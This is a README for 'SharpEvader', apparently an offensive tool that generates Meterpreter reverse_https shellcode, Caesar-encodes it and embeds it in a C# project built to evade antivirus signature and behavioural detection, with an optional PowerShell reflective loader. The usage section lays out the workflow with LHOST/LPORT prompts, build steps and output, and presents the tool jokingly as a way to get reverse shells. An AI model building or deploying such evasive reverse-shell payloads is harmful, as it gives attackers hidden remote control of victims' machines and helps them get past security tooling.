# ü§î SharpEvader
#### This is a python script which automatically generates `windows/x64/meterpreter/reverse_https` shellcode and caeser encodes it and slaps some Behavioural detection in a c# Project for you to build and run


# ‚ú® Features
- Automatically generate's `windows/x64/meterpreter/reverse_https` shellcode by borrowing `msfvenom`(What more do you expect, Write an `msfvenom` clone from scratch ??) from your linux host.
- Applies some magic sauce inorder to bypass the Signature Based detection.(The magic sauce is absolutely not Caeser Cipher).
- Generate's a C# Project with the encoded shellcode and some more spells to bypass Behavioural Based Detection.
- Quick, Order your Reverse Shell now Available at an easy installment of $999 each :)
- Powershell Script to generate a reflection ps1 script with the C# executable embedded inside it[Tested as of 1st July 2022].
- Does not use Java !!!
- Owner's or Contributor's of this repo does not take responsibiltes of any damages caused using it or with it, any illegal usage is highly discouraged.


# ‚öôÔ∏è Requirements
- Python3.7+
- msfvenom or Metasploit Framework
- Powershell on Linux[Optional]


# ü§∏ Usage
## To be done on Linux

### Run Sharpevader.py to generate the C# Project
```bash
~/SharpEvader > python3 sharpevader.py
LHOST: 10.10.10.16
LPORT: 9001
[*] Using LHOST as 10.10.10.16 and LPORT as 9001
[*] Generating msfvenom shellcode...
[+] MSFVenom Shellcode generation successful
[+] Encoded shellcode with caeser cipher with +7 as Key
[*] Deleting the msf_shellcode.hex file as no one wants it anymore
[*] Baking the fresh Shellcode into a C# project for compiling
[+] Baking successfull please compile the C# Project using Microsoft Visual Studio on Windows
[+] Happy Evasion using rev_exe_01072022021313AM!!!
```

---

### The C# project directory would be placed inside the output directory with name rev_exe_[timestamp]
```bash
~/SharpEvader/output/rev_exe_01072022021313AM > ls -l
total 28
-rwxr-xr-x 1 root root  189 Jul  1 02:13 App.config
drwxr-xr-x 2 root root 4096 Jul  1 02:13 bin
-rwxr-xr-x 1 root root 4942 Jul  1 02:13 Program.cs
drwxr-xr-x 2 root root 4096 Jul  1 02:13 Properties
-rwxr-xr-x 1 root root 3189 Jul  1 02:13 rev.csproj
-rwxr-xr-x 1 root root  892 Jul  1 02:13 rev.sln
```

## To be done on Windows
- Transfer the rev_exe_[timestamp] from the output directory and launch `rev.sln` using `Visual Studio`.
- Build the Project using the `Release` and `x64` build configuration.
- Voila !!! The built C# executable would be available in the `rev_exe_[timestamp]/bin/x64/Release/rev.exe`

---

## [Optional] Can be done in Windows/Linux with powershell available
- Execute the `reflection_pwsh_gen.ps1` supplying the `-File` argument as the absolute path to the `rev.exe`
- This would generate a `rev.ps1` which would be consist the C# binary embedded into a ps1 script which would be reflectively loaded in the memory.

---

```bash
~/SharpEvader > pwsh reflection_pwsh_gen.ps1 -File ~/SharpEvader/output/rev_exe_01072022021313AM/bin/x64/Release/rev.exe
[+] Written the C# Embedded Reflection Reverse Shell into rev.ps1
```
